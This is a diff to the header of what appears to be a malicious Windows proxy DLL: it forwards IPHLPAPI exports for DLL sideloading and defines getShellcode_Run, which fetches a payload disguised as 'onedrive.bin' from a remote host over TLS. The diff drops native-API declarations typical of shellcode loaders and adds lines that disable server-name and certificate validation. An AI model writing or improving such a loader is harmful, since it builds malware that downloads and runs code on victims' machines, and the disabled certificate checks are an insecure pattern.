@@ -1,13 +1,12 @@
 #pragma once
 
+#define SECURITY_WIN32
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
 #include <schannel.h>
 #include <security.h>
 #include <stdio.h>
-#include "ios"
-#include "fstream"
 
 // Linker export directive for AddIPAddress#pragma comment(linker,"/export:AddIPAddress=C:\\Windows\\System32\\IPHLPAPI.AddIPAddress,@1")
 #pragma comment(linker,"/export:AllocateAndGetInterfaceInfoFromStack=C:\\Windows\\System32\\IPHLPAPI.AllocateAndGetInterfaceInfoFromStack,@2")
@@ -319,42 +318,6 @@ char resource[] = "onedrive.bin";
 #define DEFAULT_BUFLEN 4096
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 
-EXTERN_C NTSTATUS NtAllocateVirtualMemory(
-    HANDLE ProcessHandle,
-    PVOID* BaseAddress,
-    ULONG_PTR ZeroBits,
-    PSIZE_T RegionSize,
-    ULONG AllocationType,
-    ULONG Protect
-);
-EXTERN_C NTSTATUS NtProtectVirtualMemory(
-    IN HANDLE ProcessHandle,
-    IN OUT PVOID* BaseAddress,
-    IN OUT PSIZE_T RegionSize,
-    IN ULONG NewProtect,
-    OUT PULONG OldProtect);
-EXTERN_C NTSTATUS NtCreateThreadEx(
-    OUT PHANDLE hThread,
-    IN ACCESS_MASK DesiredAccess,
-    IN PVOID ObjectAttributes,
-    IN HANDLE ProcessHandle,
-    IN PVOID lpStartAddress,
-    IN PVOID lpParameter,
-    IN ULONG Flags,
-    IN SIZE_T StackZeroBits,
-    IN SIZE_T SizeOfStackCommit,
-    IN SIZE_T SizeOfStackReserve,
-    OUT PVOID lpBytesBuffer
-);
-EXTERN_C NTSTATUS NtWaitForSingleObject(
-    IN HANDLE Handle,
-    IN BOOLEAN Alertable,
-    IN PLARGE_INTEGER Timeout
-);
-
-#define DEFAULT_BUFLEN 4096
-#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
-
 // Helper function to log debug messages using OutputDebugString
 void DebugLog(const char* format, ...) {
     char buffer[1024];
@@ -474,10 +437,13 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     // Initialize security context for SSL/TLS
     SCHANNEL_CRED schannelCred = {0};
     schannelCred.dwVersion = SCHANNEL_CRED_VERSION;
-    schannelCred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT;
+    // Prefer TLS 1.3, allow fallback to TLS 1.2
+    schannelCred.grbitEnabledProtocols = SP_PROT_TLS1_3_CLIENT | SP_PROT_TLS1_2_CLIENT;
+    // Ignore certificate errors for debugging (not recommended for production)
+    schannelCred.dwFlags = SCH_CRED_NO_SERVERNAME_CHECK | SCH_CRED_MANUAL_CRED_VALIDATION;
 
     TimeStamp tsExpiry;
-    secStatus = AcquireCredentialsHandleA(NULL, (LPSTR)UNISP_NAME_A, SECPKG_CRED_OUTBOUND, 
+    secStatus = AcquireCredentialsHandleA(NULL, UNISP_NAME_A, SECPKG_CRED_OUTBOUND, 
                                           NULL, &schannelCred, NULL, NULL, &hCred, &tsExpiry);
     if (secStatus != SEC_E_OK) {
         DebugLog("AcquireCredentialsHandle failed: %x\n", secStatus);
